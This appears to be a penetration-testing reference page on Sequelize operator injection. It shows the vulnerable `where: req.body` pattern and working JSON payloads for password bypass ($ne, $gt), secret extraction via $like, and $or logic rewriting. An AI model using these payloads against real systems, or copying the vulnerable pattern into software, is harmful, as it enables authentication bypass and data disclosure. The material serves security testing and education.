---
title: "Sequelize operator injection: attacker-supplied operators in where clauses"
description: When request JSON is passed into a Sequelize where clause, attacker-controlled operator keys ($gt, $ne, $like) alter query logic—authentication bypass and data disclosure without raw SQL.
keywords:
  - Sequelize
  - operator injection
  - Op.gt
  - Op.ne
  - where clause
  - NoSQL-style injection
---

# Operator injection

This is an injection into Sequelize's **query builder**, not into raw SQL. Sequelize expresses conditions with operators (`Op.gt`, `Op.ne`, `Op.like`, `Op.or`, …). When a request body or query string is parsed as JSON and passed straight into a `where` clause, an attacker can supply **operator objects** instead of plain scalars, rewriting the condition's logic—similar in spirit to NoSQL operator injection.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable pattern

```js
// req.body = { "username": "...", "password": "..." }
const user = await User.findOne({ where: req.body });
```

If the attacker controls the JSON shape, each field value can become an operator object rather than a string. Older Sequelize versions accepted **string-keyed operators** (`$gt`, `$ne`) from JSON by default; this is why `Op.aliases` were deprecated and string operators disabled—but apps that re-enable aliases or hand-map JSON to `Op` symbols remain exposed.

## Exploitation

**Authentication / check bypass** — make a condition always true or skip the password match:

```json
{ "username": "admin", "password": { "$ne": null } }
{ "username": "admin", "password": { "$gt": "" } }
```

The `password <> NULL` / `password > ''` condition matches the stored row, so `findOne` returns the admin without knowing the password.

**Boolean enumeration** — `$like`/`$startsWith` turn a lookup into an oracle:

```json
{ "username": "admin", "password": { "$like": "a%" } }
```

Response differences leak the secret character by character.

**Logic rewriting** — injecting `$or`/`$and` keys broadens the match set:

```json
{ "$or": [ { "id": 1 }, { "is_admin": true } ] }
```

The fix pattern (coercing fields to primitives / never spreading request JSON into `where`) is defensive and out of scope here; offensively, the tell is any `where: <user-controlled object>` where field values aren't coerced to scalars.

## References

- [Sequelize docs: Operators](https://sequelize.org/docs/v6/core-concepts/model-querying-basics/#operators)
- [Sequelize security: operator aliases](https://sequelize.org/docs/v6/other-topics/legacy/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
